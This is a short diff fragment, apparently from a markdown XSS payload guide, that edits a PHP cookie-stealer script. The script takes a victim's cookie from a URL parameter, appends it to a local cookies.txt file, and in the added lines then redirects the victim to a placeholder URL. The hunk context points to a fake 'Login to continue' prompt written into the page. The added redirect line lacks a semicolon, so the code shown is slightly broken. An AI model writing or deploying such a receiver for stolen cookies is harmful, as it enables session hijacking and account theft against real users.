@@ -57,6 +57,9 @@ document.write('<h3>Login to continue</h3>
 
 ```php
 <?php
+$url = "<URL_to_redirect>"
+header('Location: '. $url);
+
 $cookie = $_GET['cookie'];
 $fp = fopen('cookies.txt', 'a+');
 fwrite($fp, 'Cookie:' . $cookie . "\r\n");
